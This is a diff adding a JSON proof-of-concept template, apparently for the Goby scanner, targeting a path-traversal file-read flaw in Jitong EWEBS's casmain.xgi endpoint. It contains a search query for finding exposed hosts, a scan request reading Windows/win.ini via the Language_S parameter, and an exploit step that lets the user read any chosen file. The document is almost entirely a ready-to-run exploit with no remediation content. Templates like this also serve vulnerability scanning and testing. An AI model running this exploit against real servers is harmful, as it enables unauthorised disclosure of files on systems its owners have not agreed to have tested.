@@ -1,0 +1,87 @@
+{
+      "Name": "Jitong EWEBS Fileread",
+      "Level": "3",
+      "Tags": [
+            "fileread"
+      ],
+      "GobyQuery": "body=\"极通软件\"",
+      "Description": "",
+      "Product": "Jitong EWEBS",
+      "Homepage": "http://www.n-soft.com.cn/",
+      "Author": "",
+      "Impact": "A vulnerability in EWEBS's 'casmain.xgi' endpoint allows remote attackers to disclose the content of locally stored files via the 'Language_S' parameter.",
+      "Recommendation": "",
+      "References": [],
+      "HasExp": true,
+      "ExpParams": [
+            {
+                  "Name": "file",
+                  "Type": "input",
+                  "Value": "../../../../../../../Windows/win.ini"
+            }
+      ],
+      "ExpTips": {
+            "Type": "",
+            "Content": ""
+      },
+      "ScanSteps": [
+            "AND",
+            {
+                  "Request": {
+                        "method": "POST",
+                        "uri": "/casmain.xgi",
+                        "follow_redirect": false,
+                        "header": {
+                              "Content-Type": "application/x-www-form-urlencoded"
+                        },
+                        "data_type": "text",
+                        "data": "Language_S=../../../../../../../Windows/win.ini"
+                  },
+                  "ResponseTest": {
+                        "type": "group",
+                        "operation": "AND",
+                        "checks": [
+                              {
+                                    "type": "item",
+                                    "variable": "$body",
+                                    "operation": "contains",
+                                    "value": "MAPI=",
+                                    "bz": ""
+                              }
+                        ]
+                  },
+                  "SetVariable": []
+            }
+      ],
+      "ExploitSteps": [
+            "AND",
+            {
+                  "Request": {
+                        "method": "POST",
+                        "uri": "/casmain.xgi",
+                        "follow_redirect": false,
+                        "header": {
+                              "Content-Type": "application/x-www-form-urlencoded"
+                        },
+                        "data_type": "text",
+                        "data": "Language_S={{{file}}}"
+                  },
+                  "ResponseTest": {
+                        "type": "group",
+                        "operation": "AND",
+                        "checks": [
+                              {
+                                    "type": "item",
+                                    "variable": "$body",
+                                    "operation": "contains",
+                                    "value": "MAPI=",
+                                    "bz": ""
+                              }
+                        ]
+                  },
+                  "SetVariable": []
+            }
+      ],
+      "PostTime": "0000-00-00 00:00:00",
+      "GobyVersion": "0.0.0"
+}
